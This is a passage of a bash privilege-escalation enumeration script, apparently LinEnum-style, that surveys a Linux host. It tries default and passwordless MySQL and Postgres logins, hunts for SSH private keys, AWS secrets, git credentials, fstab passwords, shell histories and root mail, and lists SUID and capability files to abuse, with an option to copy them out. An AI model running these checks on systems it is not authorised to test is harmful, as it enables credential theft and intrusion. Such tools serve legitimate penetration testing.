nicinfo=`/sbin/ifconfig -a 2>/dev/null`
if [ "$nicinfo" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfo" 
  echo -e "\n"
fi

#nic information (using ip)
nicinfoip=`/sbin/ip a 2>/dev/null`
if [ ! "$nicinfo" ] && [ "$nicinfoip" ]; then
  echo -e "\e[00;31m[-] Network and IP info:\e[00m\n$nicinfoip" 
  echo -e "\n"
fi

arpinfo=`arp -a 2>/dev/null`
if [ "$arpinfo" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfo" 
  echo -e "\n"
fi

arpinfoip=`ip n 2>/dev/null`
if [ ! "$arpinfo" ] && [ "$arpinfoip" ]; then
  echo -e "\e[00;31m[-] ARP history:\e[00m\n$arpinfoip" 
  echo -e "\n"
fi

#dns settings
nsinfo=`grep "nameserver" /etc/resolv.conf 2>/dev/null`
if [ "$nsinfo" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfo" 
  echo -e "\n"
fi

nsinfosysd=`systemd-resolve --status 2>/dev/null`
if [ "$nsinfosysd" ]; then
  echo -e "\e[00;31m[-] Nameserver(s):\e[00m\n$nsinfosysd" 
  echo -e "\n"
fi

#default route configuration
defroute=`route 2>/dev/null | grep default`
if [ "$defroute" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defroute" 
  echo -e "\n"
fi

#default route configuration
defrouteip=`ip r 2>/dev/null | grep default`
if [ ! "$defroute" ] && [ "$defrouteip" ]; then
  echo -e "\e[00;31m[-] Default route:\e[00m\n$defrouteip" 
  echo -e "\n"
fi

#listening TCP
tcpservs=`netstat -ntpl 2>/dev/null`
if [ "$tcpservs" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservs" 
  echo -e "\n"
fi

tcpservsip=`ss -t -l -n 2>/dev/null`
if [ ! "$tcpservs" ] && [ "$tcpservsip" ]; then
  echo -e "\e[00;31m[-] Listening TCP:\e[00m\n$tcpservsip" 
  echo -e "\n"
fi

#listening UDP
udpservs=`netstat -nupl 2>/dev/null`
if [ "$udpservs" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservs" 
  echo -e "\n"
fi

udpservsip=`ss -u -l -n 2>/dev/null`
if [ ! "$udpservs" ] && [ "$udpservsip" ]; then
  echo -e "\e[00;31m[-] Listening UDP:\e[00m\n$udpservsip" 
  echo -e "\n"
fi
}

services_info()
{
echo -e "\e[00;33m### SERVICES #############################################\e[00m" 

#running processes
psaux=`ps aux 2>/dev/null`
if [ "$psaux" ]; then
  echo -e "\e[00;31m[-] Running processes:\e[00m\n$psaux" 
  echo -e "\n"
fi

#lookup process binary path and permissisons
procperm=`ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null`
if [ "$procperm" ]; then
  echo -e "\e[00;31m[-] Process binaries and associated permissions (from above list):\e[00m\n$procperm" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$procperm" ]; then
procpermbase=`ps aux 2>/dev/null | awk '{print $11}' | xargs -r ls 2>/dev/null | awk '!x[$0]++' 2>/dev/null`
  mkdir $format/ps-export/ 2>/dev/null
  for i in $procpermbase; do cp --parents $i $format/ps-export/; done 2>/dev/null
fi

#anything 'useful' in inetd.conf
inetdread=`cat /etc/inetd.conf 2>/dev/null`
if [ "$inetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/inetd.conf:\e[00m\n$inetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$inetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/inetd.conf $format/etc-export/inetd.conf 2>/dev/null
fi

#very 'rough' command to extract associated binaries from inetd.conf & show permisisons of each
inetdbinperms=`awk '{print $7}' /etc/inetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$inetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related inetd binary permissions:\e[00m\n$inetdbinperms" 
  echo -e "\n"
fi

xinetdread=`cat /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdread" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/xinetd.conf:\e[00m\n$xinetdread" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$xinetdread" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/xinetd.conf $format/etc-export/xinetd.conf 2>/dev/null
fi

xinetdincd=`grep "/etc/xinetd.d" /etc/xinetd.conf 2>/dev/null`
if [ "$xinetdincd" ]; then
  echo -e "\e[00;31m[-] /etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:\e[00m"; ls -la /etc/xinetd.d 2>/dev/null 
  echo -e "\n"
fi

#very 'rough' command to extract associated binaries from xinetd.conf & show permisisons of each
xinetdbinperms=`awk '{print $7}' /etc/xinetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$xinetdbinperms" ]; then
  echo -e "\e[00;31m[-] The related xinetd binary permissions:\e[00m\n$xinetdbinperms" 
  echo -e "\n"
fi

initdread=`ls -la /etc/init.d 2>/dev/null`
if [ "$initdread" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ binary permissions:\e[00m\n$initdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
initdperms=`find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initdperms" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ files not belonging to root:\e[00m\n$initdperms" 
  echo -e "\n"
fi

rcdread=`ls -la /etc/rc.d/init.d 2>/dev/null`
if [ "$rcdread" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d binary permissions:\e[00m\n$rcdread" 
  echo -e "\n"
fi

#init.d files NOT belonging to root!
rcdperms=`find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$rcdperms" ]; then
  echo -e "\e[00;31m[-] /etc/rc.d/init.d files not belonging to root:\e[00m\n$rcdperms" 
  echo -e "\n"
fi

usrrcdread=`ls -la /usr/local/etc/rc.d 2>/dev/null`
if [ "$usrrcdread" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d binary permissions:\e[00m\n$usrrcdread" 
  echo -e "\n"
fi

#rc.d files NOT belonging to root!
usrrcdperms=`find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$usrrcdperms" ]; then
  echo -e "\e[00;31m[-] /usr/local/etc/rc.d files not belonging to root:\e[00m\n$usrrcdperms" 
  echo -e "\n"
fi

initread=`ls -la /etc/init/ 2>/dev/null`
if [ "$initread" ]; then
  echo -e "\e[00;31m[-] /etc/init/ config file permissions:\e[00m\n$initread"
  echo -e "\n"
fi

# upstart scripts not belonging to root
initperms=`find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$initperms" ]; then
   echo -e "\e[00;31m[-] /etc/init/ config files not belonging to root:\e[00m\n$initperms"
   echo -e "\n"
fi

systemdread=`ls -lthR /lib/systemd/ 2>/dev/null`
if [ "$systemdread" ]; then
  echo -e "\e[00;31m[-] /lib/systemd/* config file permissions:\e[00m\n$systemdread"
  echo -e "\n"
fi

# systemd files not belonging to root
systemdperms=`find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null`
if [ "$systemdperms" ]; then
   echo -e "\e[00;33m[+] /lib/systemd/* config files not belonging to root:\e[00m\n$systemdperms"
   echo -e "\n"
fi
}

software_configs()
{
echo -e "\e[00;33m### SOFTWARE #############################################\e[00m" 

#sudo version - check to see if there are any known vulnerabilities with this
sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null`
if [ "$sudover" ]; then
  echo -e "\e[00;31m[-] Sudo version:\e[00m\n$sudover" 
  echo -e "\n"
fi

#mysql details - if installed
mysqlver=`mysql --version 2>/dev/null`
if [ "$mysqlver" ]; then
  echo -e "\e[00;31m[-] MYSQL version:\e[00m\n$mysqlver" 
  echo -e "\n"
fi

#checks to see if root/root will get us a connection
mysqlconnect=`mysqladmin -uroot -proot version 2>/dev/null`
if [ "$mysqlconnect" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service with default root/root credentials!\e[00m\n$mysqlconnect" 
  echo -e "\n"
fi

#mysql version details
mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
if [ "$mysqlconnectnopass" ]; then
  echo -e "\e[00;33m[+] We can connect to the local MYSQL service as 'root' and without a password!\e[00m\n$mysqlconnectnopass" 
  echo -e "\n"
fi

#postgres details - if installed
postgver=`psql -V 2>/dev/null`
if [ "$postgver" ]; then
  echo -e "\e[00;31m[-] Postgres version:\e[00m\n$postgver" 
  echo -e "\n"
fi

#checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
postcon1=`psql -U postgres -w template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon1" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'postgres' with no password!:\e[00m\n$postcon1" 
  echo -e "\n"
fi

postcon11=`psql -U postgres -w template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon11" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'postgres' with no password!:\e[00m\n$postcon11" 
  echo -e "\n"
fi

postcon2=`psql -U pgsql -w template0 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon2" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'psql' with no password!:\e[00m\n$postcon2" 
  echo -e "\n"
fi

postcon22=`psql -U pgsql -w template1 -c 'select version()' 2>/dev/null | grep version`
if [ "$postcon22" ]; then
  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'psql' with no password!:\e[00m\n$postcon22" 
  echo -e "\n"
fi

#apache details - if installed
apachever=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
if [ "$apachever" ]; then
  echo -e "\e[00;31m[-] Apache version:\e[00m\n$apachever" 
  echo -e "\n"
fi

#what account is apache running under
apacheusr=`grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null`
if [ "$apacheusr" ]; then
  echo -e "\e[00;31m[-] Apache user configuration:\e[00m\n$apacheusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$apacheusr" ]; then
  mkdir --parents $format/etc-export/apache2/ 2>/dev/null
  cp /etc/apache2/envvars $format/etc-export/apache2/envvars 2>/dev/null
fi

#installed apache modules
apachemodules=`apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null`
if [ "$apachemodules" ]; then
  echo -e "\e[00;31m[-] Installed Apache modules:\e[00m\n$apachemodules" 
  echo -e "\n"
fi

#htpasswd check
htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
if [ "$htpasswd" ]; then
    echo -e "\e[00;33m[-] htpasswd found - could contain passwords:\e[00m\n$htpasswd"
    echo -e "\n"
fi

#anything in the default http home dirs (a thorough only check as output can be large)
if [ "$thorough" = "1" ]; then
  apachehomedirs=`ls -alhR /var/www/ 2>/dev/null; ls -alhR /srv/www/htdocs/ 2>/dev/null; ls -alhR /usr/local/www/apache2/data/ 2>/dev/null; ls -alhR /opt/lampp/htdocs/ 2>/dev/null`
  if [ "$apachehomedirs" ]; then
    echo -e "\e[00;31m[-] www home dir contents:\e[00m\n$apachehomedirs" 
    echo -e "\n"
  fi
fi

}

interesting_files()
{
echo -e "\e[00;33m### INTERESTING FILES ####################################\e[00m" 

#checks to see if various files are installed
echo -e "\e[00;31m[-] Useful file locations:\e[00m" ; which nc 2>/dev/null ; which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null; which curl 2>/dev/null 
echo -e "\n" 

#limited search for installed compilers
compiler=`dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
if [ "$compiler" ]; then
  echo -e "\e[00;31m[-] Installed compilers:\e[00m\n$compiler" 
  echo -e "\n"
fi

#manual check - lists out sensitive files, can we read/modify etc.
echo -e "\e[00;31m[-] Can we read/write sensitive files:\e[00m" ; ls -la /etc/passwd 2>/dev/null ; ls -la /etc/group 2>/dev/null ; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null ; ls -la /etc/master.passwd 2>/dev/null 
echo -e "\n" 

#search for suid files
allsuid=`find / -perm -4000 -type f 2>/dev/null`
findsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsuid" ]; then
  echo -e "\e[00;31m[-] SUID files:\e[00m\n$findsuid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsuid" ]; then
  mkdir $format/suid-files/ 2>/dev/null
  for i in $findsuid; do cp $i $format/suid-files/; done 2>/dev/null
fi

#list of 'interesting' suid files - feel free to make additions
intsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsuid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SUID files:\e[00m\n$intsuid" 
  echo -e "\n"
fi

#lists world-writable suid files
wwsuid=`find $allsuid -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuid" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files:\e[00m\n$wwsuid" 
  echo -e "\n"
fi

#lists world-writable suid files owned by root
wwsuidrt=`find $allsuid -uid 0 -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files owned by root:\e[00m\n$wwsuidrt" 
  echo -e "\n"
fi

#search for sgid files
allsgid=`find / -perm -2000 -type f 2>/dev/null`
findsgid=`find $allsgid -perm -2000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsgid" ]; then
  echo -e "\e[00;31m[-] SGID files:\e[00m\n$findsgid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsgid" ]; then
  mkdir $format/sgid-files/ 2>/dev/null
  for i in $findsgid; do cp $i $format/sgid-files/; done 2>/dev/null
fi

#list of 'interesting' sgid files
intsgid=`find $allsgid -perm -2000 -type f  -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsgid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SGID files:\e[00m\n$intsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files
wwsgid=`find $allsgid -perm -2002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgid" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files:\e[00m\n$wwsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files owned by root
wwsgidrt=`find $allsgid -uid 0 -perm -2002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files owned by root:\e[00m\n$wwsgidrt" 
  echo -e "\n"
fi

#list all files with POSIX capabilities set along with there capabilities
fileswithcaps=`getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null`
if [ "$fileswithcaps" ]; then
  echo -e "\e[00;31m[+] Files with POSIX capabilities set:\e[00m\n$fileswithcaps"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fileswithcaps" ]; then
  mkdir $format/files_with_capabilities/ 2>/dev/null
  for i in $fileswithcaps; do cp $i $format/files_with_capabilities/; done 2>/dev/null
fi

#searches /etc/security/capability.conf for users associated capapilies
userswithcaps=`grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null`
if [ "$userswithcaps" ]; then
  echo -e "\e[00;33m[+] Users with specific POSIX capabilities:\e[00m\n$userswithcaps"
  echo -e "\n"
fi

if [ "$userswithcaps" ] ; then
#matches the capabilities found associated with users with the current user
matchedcaps=`echo -e "$userswithcaps" | grep \`whoami\` | awk '{print $1}' 2>/dev/null`
	if [ "$matchedcaps" ]; then
		echo -e "\e[00;33m[+] Capabilities associated with the current user:\e[00m\n$matchedcaps"
		echo -e "\n"
		#matches the files with capapbilities with capabilities associated with the current user
		matchedfiles=`echo -e "$matchedcaps" | while read -r cap ; do echo -e "$fileswithcaps" | grep "$cap" ; done 2>/dev/null`
		if [ "$matchedfiles" ]; then
			echo -e "\e[00;33m[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):\e[00m\n$matchedfiles"
			echo -e "\n"
			#lists the permissions of the files having the same capabilies associated with the current user
			matchedfilesperms=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do ls -la $f ;done 2>/dev/null`
			echo -e "\e[00;33m[+] Permissions of files with the same capabilities associated with the current user:\e[00m\n$matchedfilesperms"
			echo -e "\n"
			if [ "$matchedfilesperms" ]; then
				#checks if any of the files with same capabilities associated with the current user is writable
				writablematchedfiles=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do find $f -writable -exec ls -la {} + ;done 2>/dev/null`
				if [ "$writablematchedfiles" ]; then
					echo -e "\e[00;33m[+] User/Group writable files with the same capabilities associated with the current user:\e[00m\n$writablematchedfiles"
					echo -e "\n"
				fi
			fi
		fi
	fi
fi

#look for private keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
privatekeyfiles=`grep -rl "PRIVATE KEY-----" /home 2>/dev/null`
	if [ "$privatekeyfiles" ]; then
  		echo -e "\e[00;33m[+] Private SSH keys found!:\e[00m\n$privatekeyfiles"
  		echo -e "\n"
	fi
fi

#look for AWS keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
awskeyfiles=`grep -rli "aws_secret_access_key" /home 2>/dev/null`
	if [ "$awskeyfiles" ]; then
  		echo -e "\e[00;33m[+] AWS secret keys found!:\e[00m\n$awskeyfiles"
  		echo -e "\n"
	fi
fi

#look for git credential files - thanks djhohnstein
if [ "$thorough" = "1" ]; then
gitcredfiles=`find / -name ".git-credentials" 2>/dev/null`
	if [ "$gitcredfiles" ]; then
  		echo -e "\e[00;33m[+] Git credentials saved on the machine!:\e[00m\n$gitcredfiles"
  		echo -e "\n"
	fi
fi

#list all world-writable files excluding /proc and /sys
if [ "$thorough" = "1" ]; then
wwfiles=`find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwfiles" ]; then
		echo -e "\e[00;31m[-] World-writable files (excluding /proc and /sys):\e[00m\n$wwfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wwfiles" ]; then
		mkdir $format/ww-files/ 2>/dev/null
		for i in $wwfiles; do cp --parents $i $format/ww-files/; done 2>/dev/null
	fi
fi

#are any .plan files accessible in /home (could contain useful information)
usrplan=`find /home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$usrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$usrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $usrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

bsdusrplan=`find /usr/home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$bsdusrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$bsdusrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdusrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $bsdusrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

#are there any .rhosts files accessible - these may allow us to login as another user etc.
rhostsusr=`find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$rhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostsusr" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

bsdrhostsusr=`find /usr/home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$bsdrhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$bsdrhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdrhostsusr" ]; then
  mkdir $format/rhosts 2>/dev/null
  for i in $bsdrhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

rhostssys=`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostssys" ]; then
  echo -e "\e[00;33m[+] Hosts.equiv file and contents: \e[00m\n$rhostssys" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostssys" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostssys; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

#list nfs shares/permisisons etc.
nfsexports=`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`
if [ "$nfsexports" ]; then
  echo -e "\e[00;31m[-] NFS config details: \e[00m\n$nfsexports" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$nfsexports" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/exports $format/etc-export/exports 2>/dev/null
fi

if [ "$thorough" = "1" ]; then
  #phackt
  #displaying /etc/fstab
  fstab=`cat /etc/fstab 2>/dev/null`
  if [ "$fstab" ]; then
    echo -e "\e[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems\e[00m"
    echo -e "$fstab"
    echo -e "\n"
  fi
fi

#looking for credentials in /etc/fstab
fstab=`grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null`
if [ "$fstab" ]; then
  echo -e "\e[00;33m[+] Looks like there are credentials in /etc/fstab!\e[00m\n$fstab"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fstab" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

fstabcred=`grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null`
if [ "$fstabcred" ]; then
    echo -e "\e[00;33m[+] /etc/fstab contains a credentials file!\e[00m\n$fstabcred" 
    echo -e "\n"
fi

if [ "$export" ] && [ "$fstabcred" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

#use supplied keyword and cat *.conf files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.conf files as no keyword was entered\n" 
  else
    confkey=`find / -maxdepth 4 -name *.conf -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$confkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$confkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .conf files" 
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$confkey" ]; then
	  confkeyfile=`find / -maxdepth 4 -name *.conf -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/config_files/ 2>/dev/null
      for i in $confkeyfile; do cp --parents $i $format/keyword_file_matches/config_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.php files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.php files as no keyword was entered\n" 
  else
    phpkey=`find / -maxdepth 10 -name *.php -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$phpkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels - output format filepath:identified line number where keyword appears):\e[00m\n$phpkey" 
      echo -e "\n" 
     else 
  echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels):\e[00m" 
  echo -e "'$keyword' not found in any .php files" 
  echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$phpkey" ]; then
    phpkeyfile=`find / -maxdepth 10 -name *.php -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/php_files/ 2>/dev/null
      for i in $phpkeyfile; do cp --parents $i $format/keyword_file_matches/php_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.log files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.log files as no keyword was entered\n" 
  else
    logkey=`find / -maxdepth 4 -name *.log -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$logkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$logkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .log files"
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$logkey" ]; then
      logkeyfile=`find / -maxdepth 4 -name *.log -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
	  mkdir --parents $format/keyword_file_matches/log_files/ 2>/dev/null
      for i in $logkeyfile; do cp --parents $i $format/keyword_file_matches/log_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.ini files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.ini files as no keyword was entered\n" 
  else
    inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$inikey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$inikey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .ini files" 
	echo -e "\n"
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$inikey" ]; then
	  inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/ini_files/ 2>/dev/null
      for i in $inikey; do cp --parents $i $format/keyword_file_matches/ini_files/ ; done 2>/dev/null
  fi
fi

#quick extract of .conf files from /etc - only 1 level
allconf=`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null`
if [ "$allconf" ]; then
  echo -e "\e[00;31m[-] All *.conf files in /etc (recursive 1 level):\e[00m\n$allconf" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$allconf" ]; then
  mkdir $format/conf-files/ 2>/dev/null
  for i in $allconf; do cp --parents $i $format/conf-files/; done 2>/dev/null
fi

#extract any user history files that are accessible
usrhist=`ls -la ~/.*_history 2>/dev/null`
if [ "$usrhist" ]; then
  echo -e "\e[00;31m[-] Current user's history files:\e[00m\n$usrhist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrhist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  for i in $usrhist; do cp --parents $i $format/history_files/; done 2>/dev/null
fi

#can we read roots *_history files - could be passwords stored etc.
roothist=`ls -la /root/.*_history 2>/dev/null`
if [ "$roothist" ]; then
  echo -e "\e[00;33m[+] Root's history files are accessible!\e[00m\n$roothist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$roothist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  cp $roothist $format/history_files/ 2>/dev/null
fi

#all accessible .bash_history files in /home
checkbashhist=`find /home -name .bash_history -print -exec cat {} 2>/dev/null \;`
if [ "$checkbashhist" ]; then
  echo -e "\e[00;31m[-] Location and contents (if accessible) of .bash_history file(s):\e[00m\n$checkbashhist"
  echo -e "\n"
fi

#any .bak files that may be of interest
bakfiles=`find / -name *.bak -type f 2</dev/null`
if [ "$bakfiles" ]; then
  echo -e "\e[00;31m[-] Location and Permissions (if accessible) of .bak file(s):\e[00m"
  for bak in `echo $bakfiles`; do ls -la $bak;done
  echo -e "\n"
fi

#is there any mail accessible
readmail=`ls -la /var/mail 2>/dev/null`
if [ "$readmail" ]; then
  echo -e "\e[00;31m[-] Any interesting mail in /var/mail:\e[00m\n$readmail" 
  echo -e "\n"
fi

#can we read roots mail
readmailroot=`head /var/mail/root 2>/dev/null`
if [ "$readmailroot" ]; then
  echo -e "\e[00;33m[+] We can read /var/mail/root! (snippet below)\e[00m\n$readmailroot" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmailroot" ]; then
  mkdir $format/mail-from-root/ 2>/dev/null
  cp $readmailroot $format/mail-from-root/ 2>/dev/null
fi
}

docker_checks()
{

